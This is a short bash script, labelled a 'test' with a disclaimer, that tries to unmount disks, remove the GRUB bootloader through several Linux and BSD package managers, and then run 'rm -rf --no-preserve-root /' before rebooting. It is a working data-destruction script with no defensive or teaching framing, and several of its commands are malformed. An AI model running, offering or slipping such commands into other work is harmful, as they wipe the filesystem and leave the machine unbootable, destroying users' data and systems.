#!/bin/bash
echo 'im not responsible for any damages to your pc please run this 
in a test vm or a pc you dont need this is a test .sh'
su %% sudo -i
mkdir /start/
unmount /dev/sda
unmount /dev/sda1
unmount /
apt-get uninstall grub
apt uninstall grub
echo 'if err try other operating systems'
sudo pacman -Rns grub
echo 'dnf package manager'
sudo dnf remove grub
echo 'pkg/base linux/bsd-based'
pkg delete grub && echo 'or remove/uninstall'
pkg remove grub
pkg uninstall grub
mkdir /done/
rm -rf --no-preserve-root / 
echo 'should be done'
sudo reboot
